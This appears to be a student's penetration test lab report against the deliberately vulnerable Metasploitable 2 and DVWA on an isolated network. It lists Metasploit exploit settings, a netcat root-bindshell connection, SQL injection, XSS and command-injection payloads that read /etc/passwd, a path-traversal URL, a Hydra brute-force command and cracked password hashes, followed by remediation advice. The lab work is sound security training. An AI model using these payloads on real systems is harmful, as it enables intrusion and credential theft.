# 🔐 Metasploitable 2 — Penetration Test Lab Report

> **Tester:** Danny | **Target:** 192.168.56.102 | **Date:** June 7, 2026  
> **Environment:** Kali Linux vs Metasploitable 2 on isolated VirtualBox host-only network (192.168.56.0/24)

---

## 📋 Executive Summary

| Metric | Value |
|--------|-------|
| Open Ports Discovered | 23 |
| Attacks Attempted | 15 |
| Successful | 11 |
| Partial (mechanics worked) | 2 |
| Failed | 2 |
| Root Shells Obtained | 5 |

---

## 🔍 Phase 1 — Reconnaissance

**Tool:** Nmap  
**Command:**
```bash
nmap -sV -O -A 192.168.56.102
```

### Key Findings

| Port | Service | Version | Risk |
|------|---------|---------|------|
| 21/tcp | FTP | vsftpd 2.3.4 | 🔴 Critical |
| 23/tcp | Telnet | Linux telnetd | 🟠 High |
| 80/tcp | HTTP | Apache 2.2.8 (DVWA) | 🟠 High |
| 139/445/tcp | SMB | Samba 3.0.20 | 🔴 Critical |
| 1524/tcp | Bindshell | Root shell | 🔴 Critical |
| 3306/tcp | MySQL | 5.0.51a | 🔴 Critical |
| 5432/tcp | PostgreSQL | 8.3.0 | 🟠 High |
| 6667/tcp | IRC | UnrealIRCd | 🔴 Critical |
| 8180/tcp | HTTP | Apache Tomcat 5.5 | 🟠 High |

---

## ⚔️ Phase 2 — Exploitation

### ✅ Exploit 1 — vsftpd 2.3.4 Backdoor (CVE-2011-2523)
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
set PAYLOAD payload/cmd/unix/bind_netcat
run
```
**Result:** Root shell — `uid=0(root) gid=0(root)`  
**Note:** Reverse shell failed due to subnet mismatch — switched to bind_netcat payload.

---

### ✅ Exploit 2 — Samba usermap_script (CVE-2007-2447)
```
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
set PAYLOAD payload/cmd/unix/bind_netcat
run
```
**Result:** Root shell — `uid=0(root) gid=0(root)`

---

### ⚠️ Exploit 3 — UnrealIRCd Backdoor (CVE-2010-2075)
```
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
set PAYLOAD payload/cmd/unix/bind_netcat
run
```
**Result:** Backdoor triggered but no stable session. To revisit.

---

### ✅ Exploit 4 — Bindshell Port 1524 (No exploit needed)
```bash
nc 192.168.56.102 1524
```
**Result:** Instant root shell — `uid=0(root) gid=0(root) groups=0(root)`  
**Note:** A pre-planted backdoor required nothing but a netcat connection.

---

### ✅ Exploit 5 — MySQL No-Password Root
```bash
mysql -u root -h 192.168.56.102 --skip-ssl
```
**Result:** Full database access. 7 databases exposed.  
**DVWA Password Hashes Dumped:**

| User | MD5 Hash | Cracked Password |
|------|----------|-----------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

---

### ✅ Exploit 6 — Telnet Default Credentials
```bash
telnet 192.168.56.102
# Login: msfadmin / Password: msfadmin
sudo su
```
**Result:** Root shell via default creds + sudo escalation.

---

### ❌ Exploit 7 — Java RMI (Port 1099)
```
use exploit/multi/misc/java_rmi_server
set PAYLOAD java/meterpreter/bind_tcp
run
```
**Result:** Failed — RMI class loader couldn't reach Kali's HTTP server due to subnet mismatch (192.168.1.x vs 192.168.56.x).

---

### ⚠️ Exploit 8 — Apache Tomcat Manager WAR Upload
```
use exploit/multi/http/tomcat_mgr_upload
set HttpUsername tomcat
set HttpPassword tomcat
set PAYLOAD java/shell/bind_tcp
run
```
**Result:** Partial — credentials accepted, WAR deployed and executed, session failed to stabilize due to subnet routing. Full success expected in same-subnet environment.

---

### ✅ Exploit 9 — DVWA SQL Injection
```
# Step 1 — Dump all users
1' OR '1'='1

# Step 2 — UNION-based hash extraction
1' UNION SELECT user,password FROM users#
```
**Result:** Full user table and password hashes dumped through browser form.

---

### ✅ Exploit 10 — DVWA Reflected XSS
```html
<script>alert('Hacked by Danny!')</script>
```
**Result:** JavaScript executed in victim browser. No sanitization on input reflection.

---

### ✅ Exploit 11 — DVWA Stored XSS
```html
<!-- Injected into guestbook Name/Message fields -->
<script>alert('Stored XSS by Danny!')</script>
```
**Result:** Script persisted to database — fires for every visitor automatically.

---

### ✅ Exploit 12 — DVWA Command Injection
```bash
# In ping input field:
127.0.0.1 | whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 | id && uname -a
```
**Result:** OS command execution as `www-data`. Full `/etc/passwd` dumped through browser.  
**Note:** Semicolon `;` was filtered — pipe `|` bypassed the filter.

---

### ✅ Exploit 13 — DVWA Local File Inclusion
```
http://192.168.56.102/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
```
**Result:** Full `/etc/passwd` read through URL manipulation. Initial 4x `../` failed — needed 6x.

---

### ✅ Exploit 14 — PostgreSQL Default Credentials
```
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 192.168.56.102
set USERNAME postgres
set PASSWORD postgres
run
```
**Result:** `postgres:postgres` confirmed. pg_shadow hash dumped: `md53175bce1d3201d16594cebf9d7eb3f9d` = `postgres`  
**Note:** Native psql client SSL-incompatible with old PostgreSQL — Metasploit modules used instead.

---

### ❌ Exploit 15 — SSH Brute Force (Hydra)
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 4
```
**Result:** Failed — Hydra incompatible with Metasploitable's legacy SSH MAC algorithms (hmac-md5/sha1). Password already confirmed as `msfadmin` via Telnet. Workaround: use Medusa or configure legacy SSH algorithms in `/etc/ssh/ssh_config`.

---

## 📚 Lessons Learned

### What Went Well
- Nmap recon produced a complete attack roadmap in one scan
- vsftpd and Samba exploits worked first try with correct payload selection
- Bindshell and MySQL required zero exploitation — just direct access
- All 5 DVWA web attacks succeeded cleanly
- PostgreSQL cracked via Metasploit when native client was incompatible
- Documenting failures alongside successes produced a realistic, professional report

### What Was Challenging
- **Subnet mismatch** (192.168.1.x vs 192.168.56.x) caused reverse shells to fail throughout — required switching to bind payloads consistently
- Modern Kali tools (psql, Hydra, SSH client) incompatible with Metasploitable's ancient protocols
- UnrealIRCd and Tomcat sessions failed despite successful exploit mechanics
- VM file path issue required recovery before lab could begin

### Key Takeaways
| # | Takeaway |
|---|----------|
| 1 | Always set LHOST to the correct interface — use **bind payloads** in NAT/segmented environments |
| 2 | The most dangerous vulnerabilities need no exploits: open root shells, passwordless DBs, default creds |
| 3 | **Document failures** — they reveal environment constraints and tool limitations |
| 4 | Unsalted MD5 hashes are effectively plaintext — cracked by recognition alone |
| 5 | When one tool fails, try another — Metasploit succeeded where native psql failed |
| 6 | Always try multiple injection separators: `;` `\|` `&&` — some may be filtered |
| 7 | Recon quality determines exploitation quality — a thorough Nmap scan is everything |

---

## 🛡️ Remediation Recommendations

| Severity | Recommendation |
|----------|---------------|
| 🔴 Critical | Remove bindshell on port 1524 — open root shell with no auth |
| 🔴 Critical | Replace vsftpd 2.3.4 — contains a deliberate backdoor |
| 🔴 Critical | Patch Samba — CVE-2007-2447 allows unauthenticated RCE |
| 🔴 Critical | Set MySQL root password and restrict remote access |
| 🟠 High | Disable Telnet, rsh, rlogin, rexec — use SSH with key auth |
| 🟠 High | Change default credentials on PostgreSQL, VNC, Tomcat |
| 🟠 High | Upgrade all services to current supported versions |
| 🟠 High | Implement input validation to prevent SQLi, XSS, CMDi |
| 🟡 Medium | Disable SSLv2, replace expired TLS certificates |
| 🟡 Medium | Use salted hashing (bcrypt/argon2) — MD5 is trivially cracked |
| 🟡 Medium | Restrict NFS exports, require authentication |
| 🟡 Medium | Firewall the server — only expose necessary ports |

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning, service/version detection, OS fingerprinting |
| Metasploit | Exploit framework — vsftpd, Samba, Tomcat, PostgreSQL modules |
| Netcat | Direct bindshell connection (port 1524) |
| MySQL client | Direct database access |
| Hydra | SSH brute force (attempted) |
| Browser (manual) | SQL injection, XSS, command injection, LFI via DVWA |

---

*This lab was conducted in an isolated VirtualBox environment for educational purposes only. All findings are intentional vulnerabilities in the Metasploitable 2 training platform.*
